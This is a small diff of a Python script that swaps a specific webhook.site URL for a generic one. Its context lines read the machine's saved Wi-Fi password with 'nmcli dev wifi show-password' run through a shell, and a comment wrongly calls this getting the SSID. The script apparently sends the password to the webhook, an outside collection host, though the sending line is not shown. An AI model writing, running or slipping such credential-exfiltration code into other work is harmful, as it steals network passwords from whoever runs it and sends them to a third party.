@@ -5,7 +5,7 @@ import json
 import requests
 
 # my webhook
-url = 'https://webhook.site/f6d01eb9-2f20-4fa2-86ff-58db6570371b'
+url = 'https://webhook.site/webhook'
 
 # Get the currently connected SSID
 password = subprocess.check_output("nmcli dev wifi show-password | grep Password", shell=True).decode().strip()
